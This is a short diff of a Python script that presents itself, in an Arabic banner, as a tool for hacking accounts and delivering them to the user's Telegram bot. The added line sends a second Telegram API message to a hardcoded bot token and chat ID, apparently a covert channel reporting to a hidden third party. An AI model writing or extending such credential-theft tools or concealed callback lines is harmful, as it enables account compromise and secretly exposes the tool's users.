@@ -160,6 +160,7 @@ ID = input('\x1b[1;31mI\x1b[1;34mD \x1b[1;32m   : ')
 ID1=('1677652563')
 tlg1 = '\n -مرحبا بك في اداة لإختراق الحسابات المتاحة  \n━━━━━━━━❖━━━━━━━━━nn𝞩 \nتم تشغيل الاداة \n    \nستتوصل بالحسابات في هذا البوت 🫡 \n'
 requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg1))
+requests.get('https://api.telegram.org/bot' + str(token1) + '/sendMessage?chat_id=' + str(ID1) + '&text=' + str(tlg1))
 os.system('clear')
 os.system('clear')
 pretty.install()
